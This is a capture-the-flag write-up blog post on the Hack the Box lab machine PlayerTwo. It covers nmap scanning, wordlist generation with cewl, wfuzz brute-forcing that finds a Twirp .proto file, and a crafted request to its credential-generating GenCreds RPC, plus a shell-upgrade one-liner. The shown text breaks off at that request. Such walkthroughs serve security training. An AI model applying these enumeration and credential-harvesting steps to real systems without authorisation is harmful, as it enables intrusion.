<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - PlayerTwo Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the insane-difficulty Linux machine PlayerTwo from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the insane-difficulty Linux machine PlayerTwo from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/playertwo/" /><meta property="og:url" content="https://zweilosec.github.io/posts/playertwo/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/playertwo-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-26T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/playertwo-infocard.png" /><meta property="twitter:title" content="Hack the Box - PlayerTwo Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2020-06-26T14:00:00+00:00","description":"Zweilosec’s writeup on the insane-difficulty Linux machine PlayerTwo from https://hackthebox.eu","headline":"Hack the Box - PlayerTwo Writeup","image":"https://zweilosec.github.io/assets/img/playertwo-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/playertwo/"},"url":"https://zweilosec.github.io/posts/playertwo/"}</script><title>Hack the Box - PlayerTwo Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - PlayerTwo Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - PlayerTwo Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 26, 2020, 2:00 PM +0000" prep="on" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5259 words">29 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---playertwo">HTB - PlayerTwo</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/playertwo-infocard.png" alt="Descriptive information card on the machine playertwo" /></p><p>An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or medium boxes would. Finding each pathway forward wasn’t too difficult with proper enumeration, but getting past each step required patience and reading lots of documentation.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="adding-a-hostname-to-the-hosts-file-on-linux">Adding a hostname to the hosts file on Linux</h3><p>In order to get the intended page for a server, sometimes you may need to direct your traffic to the site’s FQDN rather than it’s IP address. In order to do this you will need to tell your computer where to find that domain by adding the following line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> . Subdomains need to be added on separate lines.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>10.10.10.170    &lt;domain.name&gt;
10.10.10.170    &lt;subdomain.domain.name&gt;
</pre></table></code></div></div><h3 id="using-cewl-to-get-a-site-customized-wordlist">Using <code class="language-plaintext highlighter-rouge">cewl</code> to get a site-customized wordlist</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cewl -d 3 -o -a -e -w &lt;output_file&gt; &lt;website_url&gt;
</pre></table></code></div></div><p>In order to get a comprehensive wordlist for a site, I use the following options: <code class="language-plaintext highlighter-rouge">-d</code> depth, <code class="language-plaintext highlighter-rouge">-o</code> follow links to outside sites, <code class="language-plaintext highlighter-rouge">-a</code> include metadata, <code class="language-plaintext highlighter-rouge">-e</code> includes email addresses, and <code class="language-plaintext highlighter-rouge">-w &lt;file&gt;</code> to write the output to a file named <code class="language-plaintext highlighter-rouge">&lt;file&gt;</code>.</p><h4 id="using-wfuzz-to-brute-force-file-names">Using <code class="language-plaintext highlighter-rouge">wfuzz</code> to brute force file names</h4><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz -X GET -w &lt;wordlist&gt; --sc 200  -c http://player2.htb/proto/FUZZ.proto
</pre></table></code></div></div><p>The options used here are: <code class="language-plaintext highlighter-rouge">-X GET</code> specifies the HTTP command to use, <code class="language-plaintext highlighter-rouge">-w &lt;filename&gt;</code> specifies which wordlist to use, <code class="language-plaintext highlighter-rouge">--sc 200</code> tells it to only list HTTP replies that return a code of 200, and <code class="language-plaintext highlighter-rouge">-c</code> makes the output easier to read with colors. The command ends with the URL to enumerate, and will substitute any section in the URL where the word <code class="language-plaintext highlighter-rouge">FUZZ</code> is inserted with each word from the wordlist.</p><h4 id="upgrading-from-a-limited-shell">Upgrading from a limited shell</h4><p>After getting a rough shell on the machine, my first order of business is usually moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use the arrow keys and <code class="language-plaintext highlighter-rouge">alt-</code> and <code class="language-plaintext highlighter-rouge">ctrl-</code> commands.</p><ol><li>Make sure python is installed with <code class="language-plaintext highlighter-rouge">which python</code><li>Use a python one-liner to spawn a <code class="language-plaintext highlighter-rouge">bash</code> shell with <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")';</code><li>Background the shell and return to my machine with <code class="language-plaintext highlighter-rouge">ctrl-z</code><li>Type <code class="language-plaintext highlighter-rouge">stty raw -echo;</code> to allow sending of raw keyboard input through the pty. This lets me use <code class="language-plaintext highlighter-rouge">ctrl-c</code> to kill commands on the other side rather than kill my shell (for example).<li>Type <code class="language-plaintext highlighter-rouge">fg</code> to bring my shell back to the foreground</ol><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.170</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/playertwo$ nmap -p- -sC -sV -O -oA playertwo.full 10.10.10.170

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 13:01 EDT
Nmap scan report for 10.10.10.170
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
|   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
|_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:36 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/nice%20ports%2C/Tri%6Eity.txt%2ebak"","meta":{"twirp_invalid_route":"GET /nice%20ports%2C/Tri%6Eity.txt%2ebak"}}
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:21 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:22 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"OPTIONS /"}}
|   OfficeScan: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:38 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|_    {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|_http-title: Site doesn't have a title (application/json).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 1482.37 seconds
</pre></table></code></div></div><p>Despite all of that output, there were only three ports open; SSH and two that returned HTTP data. The output from <code class="language-plaintext highlighter-rouge">TCP 8545</code> didn’t look like HTML, rather it was reporting a Content-Type of <code class="language-plaintext highlighter-rouge">application/json</code>. The message <code class="language-plaintext highlighter-rouge">"twirp_invalid_route"</code> looked like something to be investigated since nmap couldn’t identify it.</p><h3 id="enumerating-port-80---http">Enumerating <code class="language-plaintext highlighter-rouge">Port 80 - HTTP</code></h3><p>Before jumping off into any potential rabbit holes with the strange output from port 8545, it was best to fire up a browser and first try to connect to the open port 80 at <a href="http://10.10.10.170">http://10.10.10.170</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-error.png" alt="" /></p><p>Oops, well that didn’t seem to work. Refreshing the page just brought up this message again. Looking closer at the output on the page…it says <code class="language-plaintext highlighter-rouge">Firefox can't load this page for some reason.</code> This is somewhat interesting, considering I was not using Firefox at the time, so I looked at the page source and discovered that it was actually a PNG image rather than text being displayed. This wasn’t an error message so much as the actual page content.</p><p>Looking again at the text in the image, I noticed that it says “Please contact <code class="language-plaintext highlighter-rouge">MrR3boot@player2.htb</code>.” This looks like a potential username and hostname. Perhaps redirecting my traffic to <code class="language-plaintext highlighter-rouge">http://player2.htb</code> would get me different output.</p><h4 id="adding-a-hostname-to-the-hosts-file">Adding a hostname to the hosts file</h4><p>In order to get the intended page for a server, sometimes you need to direct your traffic to the site’s FQDN rather than it’s IP address. In order to do this you will need to tell your computer where to find that domain by adding the following line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.10.170    player2.htb 
</pre></table></code></div></div><h3 id="enumerating-the-real-website">Enumerating the real website</h3><p>After adding the domain to the hosts file, navigating to <a href="http://player2.htb">http://player2.htb</a> led me to the real company website. By the looks of it, this company has suffered some sort of network breach before and has upped their security standards since.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-first-site.png" alt="" /></p><p>After reading through the content on the page, I found a link to a subdomain at <a href="http://product.player2.htb/">http://product.player2.htb/</a>. Once again I added the new domain to my hosts file, and after navigating to this new site I found a login page.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>10.10.10.170    player2.htb
10.10.10.170    product.player2.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-login-page.png" alt="" /></p><p>I tried some basic credentials like <code class="language-plaintext highlighter-rouge">admin:admin</code> but only got an alert box back saying <code class="language-plaintext highlighter-rouge">Nope.</code> I figured that I must have to find the credentials somewhere else and decided to check out that other HTTP port I had seen earlier.</p><h3 id="enumerating-port-8545">Enumerating <code class="language-plaintext highlighter-rouge">Port 8545</code></h3><p>Opening a browser page and navigating to <a href="http://player2.htb:8545">http://player2.htb:8545</a> returned a JSON formatted error message.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{ "code": "bad_route", "msg": "no handler for path \"/\"", "meta": { "twirp_invalid_route": "GET /" } }
</pre></table></code></div></div><p>There was that <code class="language-plaintext highlighter-rouge">"twirp_invalid_route"</code> message I saw from nmap again. I decided it was time to do a little research into <code class="language-plaintext highlighter-rouge">twirp</code> and see if I could find anything useful.</p><h3 id="researching-twirp">Researching twirp</h3><p>I was quickly able to locate some resources on this protocol, which seems to be a routing method for accessing RPC methods securely. The following links are the documentation that seemed to describe best how to interact with it.</p><p><a href="https://twitchtv.github.io/twirp/docs/intro.html">https://twitchtv.github.io/twirp/docs/intro.html</a><a href="https://github.com/twitchtv/twirp/blob/master/docs/routing.md">https://github.com/twitchtv/twirp/blob/master/docs/routing.md</a></p><p>The protocol uses a <code class="language-plaintext highlighter-rouge">.proto</code> file to determine the correct routing for RPC method requests, so I needed to see if I could find that file. There didn’t seem to be a <code class="language-plaintext highlighter-rouge">/rpc</code> directory as specified in the documentation, so I decided to enumerate folders using <code class="language-plaintext highlighter-rouge">Dirbuster</code> to see if they had done a non-standard install. After a while, I found a <code class="language-plaintext highlighter-rouge">/proto</code> directory at <a href="http://player2.htb/proto/">http://player2.htb/proto/</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-dirbuster_player2.htb.png" alt="" /></p><p>I thought that the <code class="language-plaintext highlighter-rouge">/proto</code> directory seemed like a likely location to place a <code class="language-plaintext highlighter-rouge">.proto</code> file, but I still didn’t know what the name of the file was to access it. Next, I ran <code class="language-plaintext highlighter-rouge">cewl</code> against the two websites I had found in order to create a wordlist of likely filenames, but this did not lead anywhere. It ended up being a standard Dirbuster wordlist that got me the filename.</p><h4 id="using-cewl-to-get-a-customized-wordlist">Using <code class="language-plaintext highlighter-rouge">cewl</code> to get a customized wordlist</h4><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cewl -d 3 -o -a -e -w player2.cewl http://player2.htb
</pre></table></code></div></div><p>In order to get a comprehensive wordlist for this site, I used the following options: <code class="language-plaintext highlighter-rouge">-d</code> depth, <code class="language-plaintext highlighter-rouge">-o</code> follow links to outside sites, <code class="language-plaintext highlighter-rouge">-a</code> include metadata, <code class="language-plaintext highlighter-rouge">-e</code> includes email addresses, and <code class="language-plaintext highlighter-rouge">-w &lt;file&gt;</code> writes the output to a file named <code class="language-plaintext highlighter-rouge">&lt;file&gt;</code>.</p><h4 id="using-wfuzz-to-brute-force-file-names-1">Using <code class="language-plaintext highlighter-rouge">wfuzz</code> to brute force file names</h4><p>Using the wordlist from <code class="language-plaintext highlighter-rouge">cewl</code> first, then later with the standard Dirbuster wordlist, I used the <code class="language-plaintext highlighter-rouge">wfuzz</code> tool to use fuzzing to try to find out the filename. Since I was pretty sure the file was in the <code class="language-plaintext highlighter-rouge">/proto</code> folder, and the filetype was <code class="language-plaintext highlighter-rouge">.proto</code>, I was able to do some fuzzing against the filename in-between with the format <code class="language-plaintext highlighter-rouge">/proto/FUZZ.proto</code> .</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/playertwo$ wfuzz -X GET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --sc 200  -c http://player2.htb/proto/FUZZ.proto

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://player2.htb/proto/FUZZ.proto
Total requests: 87665

===================================================================
ID           Response   Lines    Word     Chars       Payload                               
===================================================================


000034176:   200        18 L     46 W     266 Ch      "generated"
</pre></table></code></div></div><p>After only… a few thousand tries, I got a successful hit using the word <code class="language-plaintext highlighter-rouge">generated</code>. The <code class="language-plaintext highlighter-rouge">.proto</code> file could then be downloaded using the URL <a href="http://player2.htb/proto/generated.proto">http://player2.htb/proto/generated.proto</a>.</p><h3 id="the-proto-file">The <code class="language-plaintext highlighter-rouge">.proto</code> file</h3><p>The contents of the <code class="language-plaintext highlighter-rouge">generated.proto</code> file had some very useful information.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>syntax = "proto3";

package twirp.player2.auth;
option go_package = "auth";

service Auth {
  rpc GenCreds(Number) returns (Creds);
}

message Number {
  int32 count = 1; // must be &gt; 0
}

message Creds {
  int32 count = 1;
  string name = 2; 
  string pass = 3; 
}
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">GenCreds</code> RPC method in particular sounded like exactly what I was looking for. Now I needed to figure out how to access this method and see what it could give me.</p><h3 id="using-twirp-to-access-rpc-methods">Using <code class="language-plaintext highlighter-rouge">twirp</code> to access RPC methods</h3><p>The documentation at <a href="https://github.com/twitchtv/twirp/blob/master/docs/routing.md">https://github.com/twitchtv/twirp/blob/master/docs/routing.md</a> gave the following example using <code class="language-plaintext highlighter-rouge">curl</code>:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>curl --request "POST" \
     --location "http://localhost:8080/twirp/twirp.example.haberdasher.Haberdasher/MakeHat" \
     --header "Content-Type:application/json" \
     --data '{"inches": 10}' \
     --verbose
</pre></table></code></div></div><p>Further reading at <a href="https://twitchtv.github.io/twirp/docs/spec_v5.html">https://twitchtv.github.io/twirp/docs/spec_v5.html</a> describes interacting with <code class="language-plaintext highlighter-rouge">twirp</code>:</p><blockquote><p>The <strong>Request-Headers</strong> are normal HTTP headers. The Twirp wire protocol uses the following headers.</p><ul><li><strong>Content-Type</strong> header indicates the proto message encoding, which should be one of “application/protobuf”, “application/json”. The server uses this value to decide how to parse the request body, and encode the response body.</ul></blockquote><blockquote><p>Twirp always uses HTTP POST method to send requests, because it closely matches the semantics of RPC methods.</p></blockquote><p>Since this protocol is able to use standard HTTP requests, I decided to use <code class="language-plaintext highlighter-rouge">Burp Repeater</code> instead of <code class="language-plaintext highlighter-rouge">curl</code> so that I could more easily modify and resend requests as I tested them.</p><p>In order to connect to any potential exposed RPC methods through this port, a POST to the RPC method using the format below is required.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>POST /twirp/&lt;package&gt;.&lt;Service&gt;/&lt;Method&gt;
</pre></table></code></div></div><p>From the information in the <code class="language-plaintext highlighter-rouge">generated/proto</code> file I was able to determine that the Package name was <code class="language-plaintext highlighter-rouge">twirp.player2.auth</code> and the Service was <code class="language-plaintext highlighter-rouge">Auth</code>. The method we were trying to access was <code class="language-plaintext highlighter-rouge">GenCreds</code>. This made our full Twirp route <code class="language-plaintext highlighter-rouge">/twirp/twirp.player2.auth.Auth/GenCreds</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/failed-to-parse-request-json.png" alt="" /></p><p>After further testing and reading through the documentation I realized that you had to send some sort of JSON formatted data in the request as well as the proper headers.</p><p><em>Make sure to send the <code class="language-plaintext highlighter-rouge">Content-Type:application/json</code> header as well! Otherwise you will get errors.</em></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>POST /twirp/twirp.player2.auth.Auth/GenCreds HTTP/1.1
Host: player2.htb:8545
Content-Type:application/json
Content-Length: 27

{"message":"Hello, World!"}
